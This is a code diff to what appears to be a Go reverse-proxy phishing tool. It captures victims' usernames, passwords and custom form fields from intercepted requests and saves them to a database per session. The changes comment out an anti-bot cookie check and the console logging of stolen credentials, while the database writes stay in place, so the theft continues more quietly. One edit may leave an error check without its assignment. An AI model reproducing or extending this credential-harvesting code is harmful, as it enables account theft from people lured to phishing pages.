@@ -166,7 +166,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// ANTIBOT
 
-			msg, err := req.Cookie("RUSSIA")
+			//msg, err := req.Cookie("RUSSIA")
 
 			if err != nil {
 				//log.Error("msg: %v", err)
@@ -176,7 +176,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if !p.isForwarderUrlBy2(req) {
 					return p.antiddos(req, ps, req_url, "USAt")
 				}
-				log.Important(msg.Value)
+				//log.Important(msg.Value)
 			}
 
 			// END ANTIBOT
@@ -559,8 +559,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
 										um := pl.username.search.FindStringSubmatch(v[0])
 										if um != nil && len(um) > 1 {
-											p.setSessionUsername(ps.SessionId, um[1])
-											log.Success("[%d] 🌟 Username: [%s]", ps.Index, um[1])
+											//p.setSessionUsername(ps.SessionId, um[1])
+											//log.Success("[%d] 🌟 Username: [%s]", ps.Index, um[1])
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
@@ -569,8 +569,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
 										pm := pl.password.search.FindStringSubmatch(v[0])
 										if pm != nil && len(pm) > 1 {
-											p.setSessionPassword(ps.SessionId, pm[1])
-											log.Success("[%d] 🔑 Password: [%s]", ps.Index, pm[1])
+											//p.setSessionPassword(ps.SessionId, pm[1])
+											//log.Success("[%d] 🔑 Password: [%s]", ps.Index, pm[1])
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
@@ -580,8 +580,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
 											cm := cp.search.FindStringSubmatch(v[0])
 											if cm != nil && len(cm) > 1 {
-												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
-												log.Success("[%d] 🛃 Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+												//p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
+												//log.Success("[%d] 🛃 Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 													log.Error("database: %v", err)
 												}
